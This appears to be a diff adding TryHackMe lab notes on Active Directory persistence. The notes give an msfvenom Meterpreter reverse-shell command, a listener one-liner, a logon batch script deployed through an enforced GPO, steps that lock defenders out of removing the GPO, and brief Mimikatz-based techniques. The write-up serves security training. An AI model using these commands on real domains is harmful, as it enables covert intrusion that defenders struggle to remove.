@@ -316,4 +316,140 @@ As can be seen, our low privilege user has full control over the group. You can 
 
 However, using our new permissions, we can add ourselves to this group:
 
+### persistence Through GPOs
+Group Policy Management in AD provides a central mechanism to manage the local policy configuration of all domain-joined machines. This includes configuration such as membership to restricted groups, firewall and AV configuration, and which scripts should be executed upon startup. While this is an excellent tool for management, it can be targeted by attackers to deploy persistence across the entire estate. What is even worse is that the attacker can often hide the GPO in such a way that it becomes almost impossible to remove it.
 
+Domain Wide Persistence
+
+The following are some common GPO persistence techniques:
+
+Restricted Group Membership - This could allow us administrative access to all hosts in the domain
+Logon Script Deployment - This will ensure that we get a shell callback every time a user authenticates to a host in the domain.
+There are many different hooks that can be deployed. You can play around with GPOs to learn about other hooks. Since we already used the first hook, Restricted Group Membership, in the Exploiting AD room. Let's now focus on the second hook. While having access to all hosts are nice, it can be even better by ensuring we get access to them when administrators are actively working on them. To do this, we will create a GPO that is linked to the Admins OU, which will allow us to get a shell on a host every time one of them authenticates to a host.
+Preparation
+
+Before we can create the GPO. We first need to create our shell, listener, and the actual bat file that will execute our shell. Let's start by generating a basic executable shell that we can use:
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=persistad lport=4445 -f exe > <username>_shell.exe
+
+<img width="1075" height="150" alt="Screenshot 2026-05-19 030146" src="https://github.com/user-attachments/assets/78a838c9-65f1-42a7-9f13-79da216b7798" />
+
+Make sure to add your username to the binary name to avoid overwriting the shells of other users. Windows allows us to execute Batch or PowerShell scripts through the logon GPO. Batch scripts are often more stable than PowerShell scripts so lets create one that will copy our executable to the host and execute it once a user authenticates. Create the following script called <username>_script.bat on the AttackBox:
+copy \\za.tryhackme.loc\sysvol\za.tryhackme.loc\scripts\<username>_shell.exe C:\tmp\<username>_shell.exe && timeout /t 20 && C:\tmp\<username>_shell.exe
+You will see that the script executes three commands chained together with &&. The script will copy the binary from the SYSVOL directory to the local machine, then wait 20 seconds, before finally executing the binary.
+
+We can use SCP and our Administrator credentials to copy both scripts to the SYSVOL directory:
+
+<img width="1035" height="240" alt="Screenshot 2026-05-19 030214" src="https://github.com/user-attachments/assets/3961dfc7-c089-473f-a8a4-d53d861347c7" />
+
+Finally, let's start our MSF listener:
+
+msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST persistad; set LPORT 4445;exploit"
+
+<img width="1052" height="291" alt="Screenshot 2026-05-19 030232" src="https://github.com/user-attachments/assets/ec63efd4-eaa2-48a8-be97-790c48bb1c12" />
+<img width="1077" height="205" alt="Screenshot 2026-05-19 030302" src="https://github.com/user-attachments/assets/297fb8a8-e678-4af2-8e72-e7c8ecdce1ef" />
+
+With our prep now complete, we can finally create the GPO that will execute it. You will need to RDP into THMWRK1 and use a runas window running as the Administrator for the next steps.
+
+<img width="1077" height="205" alt="Screenshot 2026-05-19 030302" src="https://github.com/user-attachments/assets/297fb8a8-e678-4af2-8e72-e7c8ecdce1ef" />
+
+GPO Creation
+
+The first step uses our Domain Admin account to open the Group Policy Management snap-in:
+
+In your runas-spawned terminal, type MMC and press enter.
+
+Click on File->Add/Remove Snap-in...
+
+Select the Group Policy Management snap-in and click Add
+
+Click OK
+
+You should be able to see the GPO manager:
+
+<img width="819" height="551" alt="Screenshot 2026-05-19 033027" src="https://github.com/user-attachments/assets/4dcbf64e-f8ad-4635-a05b-d57e2f1d41ae" />
+
+While we can technically write our contents to the Default Domain Policy, which should propagate to all AD objects, we will take a more narrow approach for the task just to show the process. You can play around afterwards to apply the changes to the entire domain.
+
+We will write a GPO that will be applied to all Admins, so right-click on the Admins OU and select Create a GPO in this domain, and Link it here. Give your GPO a name such as username - persisting GPO:
+
+<img width="858" height="204" alt="Screenshot 2026-05-23 013214" src="https://github.com/user-attachments/assets/228230fb-5615-4900-8685-4bd839e57f55" />
+
+Right-click on your policy and select Enforced. This will ensure that your policy will apply, even if there is a conflicting policy. This can help to ensure our GPO takes precedence, even if the blue team has written a policy that will remove our changes. Now you can right-click on your policy and select edit:
+
+<img width="734" height="225" alt="Screenshot 2026-05-23 013544" src="https://github.com/user-attachments/assets/8dda7ecd-15c1-4598-aca4-6d927b2a91e6" />
+
+Let's get back to our Group Policy Management Editor:
+
+Under User Configuration, expand Policies->Windows Settings.
+
+Select Scripts (Logon/Logoff).
+
+Right-click on Logon->Properties
+
+Select the Scripts tab.
+
+Click Add->Browse.
+
+Let's navigate to where we stored our Batch and binary files:
+
+<img width="712" height="524" alt="Screenshot 2026-05-19 030059" src="https://github.com/user-attachments/assets/54891113-ae95-4b50-bc42-2cac6aed1377" />
+
+Select your Batch file as the script and click Open and OK. Click Apply and OK. This will now ensure that every time one of the administrators (tier 2, 1, and 0) logs into any machine, we will get a callback.
+
+In order to simulate this, let's reset the password for one of the Tier 1 administrator accounts and authenticate to a server. Use any of the techniques you've learned in the previous AD rooms to either reset the password of one of the Tier 1 administrators. Once done, remember to start your MSF multi-handler, and let's test it out by RDPing into THMSERVER1 or THMSERVER2!
+
+Use your Tier 1 administrator credentials, RDP into one of the servers. If you give it another minute, you should get a callback on your multi-handler:
+
+<img width="1077" height="205" alt="Screenshot 2026-05-19 030302" src="https://github.com/user-attachments/assets/1c4ae365-8349-4807-9b73-b11ac72fbee0" />
+
+Note: You need to create a Logon event for the GPO to execute. If you just closed your RDP session, that only performs a disconnect which means it would not trigger the GPO. Make sure to select navigate to sign out as shown below in order to terminate the session. This will ensure that a Logon event is generated when you reauthenticate:
+
+<img width="676" height="684" alt="Screenshot 2026-05-23 014126" src="https://github.com/user-attachments/assets/3417d5f3-5085-417b-a881-df578462bf17" />
+
+Hiding in Plain Sight
+
+Now that we know that our persistence is working, it is time to make sure the blue team can't simply remove our persistence. Go back to your MMC windows, click on your policy and then click on Delegation:
+
+<img width="1239" height="289" alt="Screenshot 2026-05-23 014237" src="https://github.com/user-attachments/assets/44275024-2d6f-4771-a815-f9a6438ea9b5" />
+
+By default, all administrators have the ability to edit GPOs. Let's remove these permissions:
+
+Right-Click on ENTERPRISE DOMAIN CONTROLLERS and select Edit settings, delete, modify security.
+Click on all other groups (except Authenticated Users) and click Remove.
+You should be left with delegation that looks like this:
+
+<img width="897" height="193" alt="Screenshot 2026-05-23 014408" src="https://github.com/user-attachments/assets/54fb0aeb-3c92-4348-a736-4314f6b4bb97" />
+
+<img width="406" height="412" alt="Screenshot 2026-05-23 014620" src="https://github.com/user-attachments/assets/712f4513-9094-4e0e-b42e-df748b40467c" />
+
+By default, all authenticated Users must have the ability to read the policy. This is required because otherwise, the policy could not be read by the user's account when they authenticate to apply User policies. If we did not have our logon script, we could also remove this permission to make sure that almost no one would be able to read our Policy.
+
+We could replace Authenticated Users with Domain Computers to ensure that computers can still read and apply the policy, but prevent any user from reading the policy. Let's do this to test, but remember this can result in you not getting a shell callback upon authentication since the user will not be able to read the PowerShell script, so make sure to test your shell before performing these steps. There is no going back after this:
+
+Click Add.
+
+Type Domain Computers, click Check Names and then OK.
+
+Select Read permissions and click OK.
+
+Click on Authenticated Users and click Remove.
+
+Right after you perform these steps, you will get an error that you can no longer read your own policy:
+
+<img width="287" height="179" alt="Screenshot 2026-05-23 014838" src="https://github.com/user-attachments/assets/38014d8f-b852-421a-801f-78bdbb024c89" />
+
+You can also see on the sidebar that we can no longer read this policy:
+
+<img width="819" height="551" alt="Screenshot 2026-05-19 033027" src="https://github.com/user-attachments/assets/e1bf3d0e-5ba7-4ac8-9029-0588118a9fdd" />
+
+By performing these steps, we can ensure that even with the highest level of permissions, the blue team would not be able to remove our GPO unless they impersonated the machine account of a Domain Controller. This makes it extra hard to firstly discover, and even if they discover the GPO, it would be incredibly hard to remove. We don't even have the required permissions to interface with our policy anymore, so one will have to stay there until a network reset is performed. You can verify that the GPO is still applied by RDPing into one of the THMSERVERS.
+
+### Additional Persistence Techniques
+
+In this network, we covered several techniques that can be used to persist in AD. This is by no means an exhaustive list. Here is a list of persistence techniques that also deserve mention:
+
+Skeleton keys(opens in new tab) - Using Mimikatz, we can deploy a skeleton key. Mimikatz created a default password that will work for any account in the domain. Normal passwords will still work, making it hard to know that this attack has taken place. This default password can be used to impersonate any account in the domain.
+Directory Service Restore Mode (DSRM)(opens in new tab) - Domain controllers have an internal break glass administrator account called the DSRM account. This password is set when the server is promoted to a DC and is seldom changed. This password is used in cases of emergencies to recover the DC. An attacker can extract this password using Mimikatz and use this password to gain persistent administrative access to domain controllers in the environment.
+Malicious Security Support Provider (SSP)(opens in new tab) - Exploiting the SSP interface, it is possible to add new SSPs. We can add Mimikatz's mimilib as an SSP that would log all credentials of authentication attempts to a file. We can specify a network location for logging, which would allow mimilib to send us credentials as users authenticate to the compromised host, providing persistence.
+Computer Accounts(opens in new tab) - The passwords for machine accounts are normally rotated every 30 days. However, we can alter the password of a machine account which would stop the automatic rotation. Together with this, we can grant the machine account administrative access to other machines. This will allow us to use the computer account as a normal account, with the only sign of the persistence being the fact that the account has administrative rights over other hosts, which is often normal behaviour in AD, so that it may go undetected.
